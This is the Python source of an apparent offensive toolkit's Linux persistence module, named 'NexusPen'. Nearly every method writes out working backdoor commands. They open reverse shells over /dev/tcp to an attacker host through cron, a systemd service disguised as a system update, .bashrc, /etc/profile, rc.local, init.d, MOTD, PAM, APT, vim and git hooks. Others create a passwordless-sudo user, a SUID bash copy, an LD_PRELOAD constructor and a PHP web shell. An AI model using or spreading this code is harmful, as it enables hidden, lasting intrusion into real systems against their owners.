#!/usr/bin/env python3
"""
NexusPen - Linux Persistence Module
====================================
Linux persistence techniques for maintaining access.
"""

import subprocess
import os
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class PersistenceMethod:
    """Persistence method."""
    name: str
    technique: str
    command: str
    cleanup: str
    detection: str
    stealthy: bool = False


class LinuxPersistence:
    """
    Linux persistence techniques.
    For authorized post-exploitation scenarios.
    """
    
    def __init__(self, target: str = None, ssh_creds: Dict = None):
        self.target = target
        self.ssh_creds = ssh_creds
    
    def add_ssh_key(self, public_key: str, user: str = 'root') -> str:
        """Add SSH public key to authorized_keys."""
        cmd = f'''
mkdir -p /home/{user}/.ssh
echo "{public_key}" >> /home/{user}/.ssh/authorized_keys
chmod 600 /home/{user}/.ssh/authorized_keys
chmod 700 /home/{user}/.ssh
'''
        return cmd
    
    def create_backdoor_user(self, username: str = 'support', 
                             password: str = 'support123') -> str:
        """Create a backdoor user."""
        # Generate password hash
        cmd = f'''
# Create user with root shell
useradd -m -s /bin/bash {username}
echo "{username}:{password}" | chpasswd

# Optional: Add to sudoers
echo "{username} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
'''
        return cmd
    
    def create_suid_backdoor(self, path: str = '/tmp/.backdoor') -> str:
        """Create SUID backdoor binary."""
        cmd = f'''
# Create SUID copy of bash
cp /bin/bash {path}
chmod +s {path}

# Usage: {path} -p
'''
        return cmd
    
    def cron_reverse_shell(self, lhost: str, lport: int, 
                          schedule: str = '* * * * *') -> str:
        """Add cron job for reverse shell."""
        payload = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        
        cmd = f'''
# Add cron job (runs every minute by default)
(crontab -l 2>/dev/null; echo "{schedule} {payload}") | crontab -

# Or add to system cron
echo "{schedule} root {payload}" >> /etc/cron.d/system-update
'''
        return cmd
    
    def systemd_service_backdoor(self, lhost: str, lport: int,
                                 service_name: str = 'system-update') -> str:
        """Create systemd service for persistence."""
        service_content = f'''[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
'''
        
        cmd = f'''
# Create service file
cat << 'EOF' > /etc/systemd/system/{service_name}.service
{service_content}
EOF

# Enable and start
systemctl daemon-reload
systemctl enable {service_name}
systemctl start {service_name}
'''
        return cmd
    
    def bashrc_backdoor(self, lhost: str, lport: int, user: str = 'root') -> str:
        """Add backdoor to .bashrc."""
        if user == 'root':
            bashrc_path = '/root/.bashrc'
        else:
            bashrc_path = f'/home/{user}/.bashrc'
        
        payload = f'(bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &)'
        
        cmd = f'''
# Add to bashrc (silent background shell on login)
echo '{payload}' >> {bashrc_path}
'''
        return cmd
    
    def profile_backdoor(self, lhost: str, lport: int) -> str:
        """Add backdoor to /etc/profile."""
        payload = f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &>/dev/null &'
        
        cmd = f'''
# Add to system profile (executes for all users on login)
echo '{payload}' >> /etc/profile
'''
        return cmd
    
    def rc_local_backdoor(self, lhost: str, lport: int) -> str:
        """Add backdoor to rc.local."""
        payload = f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &>/dev/null &'
        
        cmd = f'''
# Add to rc.local (executes at boot)
echo '{payload}' >> /etc/rc.local
chmod +x /etc/rc.local
'''
        return cmd
    
    def init_d_backdoor(self, lhost: str, lport: int,
                        script_name: str = 'network-check') -> str:
        """Create init.d script for persistence."""
        script_content = f'''#!/bin/bash
### BEGIN INIT INFO
# Provides:          {script_name}
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       Network connectivity check
### END INIT INFO

case "$1" in
  start)
    nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &>/dev/null &
    ;;
  stop)
    ;;
  *)
    echo "Usage: $0 {{start|stop}}"
    exit 1
    ;;
esac
exit 0
'''
        
        cmd = f'''
cat << 'EOF' > /etc/init.d/{script_name}
{script_content}
EOF

chmod +x /etc/init.d/{script_name}
update-rc.d {script_name} defaults
'''
        return cmd
    
    def motd_backdoor(self, lhost: str, lport: int) -> str:
        """Add backdoor to MOTD scripts."""
        payload = f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &>/dev/null &'
        
        cmd = f'''
# Add executable script to run-parts MOTD
echo '#!/bin/bash
{payload}' > /etc/update-motd.d/99-backdoor
chmod +x /etc/update-motd.d/99-backdoor
'''
        return cmd
    
    def pam_backdoor(self, lhost: str, lport: int) -> str:
        """Add PAM backdoor (advanced)."""
        cmd = f'''
# PAM backdoor requires compiling custom module
# This is a conceptual example

# Add to pam.d common-auth:
# auth optional pam_exec.so quiet /tmp/.pam_backdoor.sh

# Create trigger script:
echo '#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &' > /tmp/.pam_backdoor.sh
chmod +x /tmp/.pam_backdoor.sh
'''
        return cmd
    
    def ld_preload_backdoor(self) -> str:
        """Generate LD_PRELOAD backdoor source."""
        source = '''
// Compile: gcc -fPIC -shared -o /tmp/.libhook.so hook.c -ldl
// Usage: echo "/tmp/.libhook.so" >> /etc/ld.so.preload

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    unsetenv("LD_PRELOAD");
    if (fork() == 0) {
        // Reverse shell code here
        system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1");
    }
}
'''
        return source
    
    def apt_backdoor(self, lhost: str, lport: int) -> str:
        """Add APT pre/post hook backdoor."""
        cmd = f'''
# Create APT hook (triggers on apt update/install)
echo 'APT::Update::Pre-Invoke {{"nohup bash -c \\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\" &>/dev/null &"}}' > /etc/apt/apt.conf.d/00backdoor
'''
        return cmd
    
    def vim_backdoor(self, lhost: str, lport: int) -> str:
        """Add vim backdoor."""
        payload = f'nohup bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" &>/dev/null &'
        
        cmd = f'''
# Add to global vimrc (triggers when any user opens vim)
echo ':!{payload}' >> /etc/vim/vimrc
'''
        return cmd
    
    def git_hooks_backdoor(self, repo_path: str, lhost: str, lport: int) -> str:
        """Add git hooks backdoor."""
        cmd = f'''
# Add post-checkout hook
echo '#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &' > {repo_path}/.git/hooks/post-checkout
chmod +x {repo_path}/.git/hooks/post-checkout
'''
        return cmd
    
    def web_shell(self, web_root: str = '/var/www/html',
                  filename: str = '.system.php') -> str:
        """Create PHP web shell."""
        webshell = '<?php system($_GET["cmd"]); ?>'
        
        cmd = f'''
echo '{webshell}' > {web_root}/{filename}
chmod 644 {web_root}/{filename}

# Usage: curl "http://target/{filename}?cmd=id"
'''
        return cmd
    
    def generate_all_methods(self, lhost: str, lport: int) -> List[PersistenceMethod]:
        """Generate all persistence methods."""
        methods = []
        
        # SSH Key
        methods.append(PersistenceMethod(
            name="SSH Key",
            technique="authorized_keys",
            command=self.add_ssh_key("<YOUR_PUBLIC_KEY>"),
            cleanup="rm ~/.ssh/authorized_keys",
            detection="Check ~/.ssh/authorized_keys",
            stealthy=True
        ))
        
        # Backdoor User
        methods.append(PersistenceMethod(
            name="Backdoor User",
            technique="useradd",
            command=self.create_backdoor_user(),
            cleanup="userdel -r support",
            detection="Check /etc/passwd for new users",
            stealthy=False
        ))
        
        # SUID Backdoor
        methods.append(PersistenceMethod(
            name="SUID Backdoor",
            technique="suid",
            command=self.create_suid_backdoor(),
            cleanup="rm /tmp/.backdoor",
            detection="find / -perm -4000",
            stealthy=False
        ))
        
        # Cron Reverse Shell
        methods.append(PersistenceMethod(
            name="Cron Reverse Shell",
            technique="crontab",
            command=self.cron_reverse_shell(lhost, lport),
            cleanup="crontab -r",
            detection="crontab -l; cat /etc/cron.d/*",
            stealthy=False
        ))
        
        # Systemd Service
        methods.append(PersistenceMethod(
            name="Systemd Service",
            technique="systemd",
            command=self.systemd_service_backdoor(lhost, lport),
            cleanup="systemctl disable system-update; rm /etc/systemd/system/system-update.service",
            detection="systemctl list-units --type=service",
            stealthy=False
        ))
        
        # Bashrc
        methods.append(PersistenceMethod(
            name="Bashrc Backdoor",
            technique="bashrc",
            command=self.bashrc_backdoor(lhost, lport),
            cleanup="Edit ~/.bashrc",
            detection="Check ~/.bashrc",
            stealthy=True
        ))
        
        return methods
    
    def display_methods(self, lhost: str, lport: int):
        """Display all persistence methods."""
        console.print("\n[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
        console.print("[bold cyan]              LINUX PERSISTENCE TECHNIQUES                   [/bold cyan]")
        console.print("[bold cyan]═══════════════════════════════════════════════════════════[/bold cyan]")
        
        table = Table(title="Available Methods", show_header=True,
                     header_style="bold magenta")
        table.add_column("Method", style="cyan", width=20)
        table.add_column("Technique", style="white", width=15)
        table.add_column("Stealthy", width=10)
        
        methods = self.generate_all_methods(lhost, lport)
        
        for m in methods:
            table.add_row(
                m.name,
                m.technique,
                "✓" if m.stealthy else "✗"
            )
        
        console.print(table)
        
        # Show commands
        console.print("\n[bold yellow]═══ PERSISTENCE COMMANDS ═══[/bold yellow]")
        for m in methods[:5]:
            console.print(f"\n[cyan]━━━ {m.name} ━━━[/cyan]")
            console.print(f"[dim]{m.command}[/dim]")
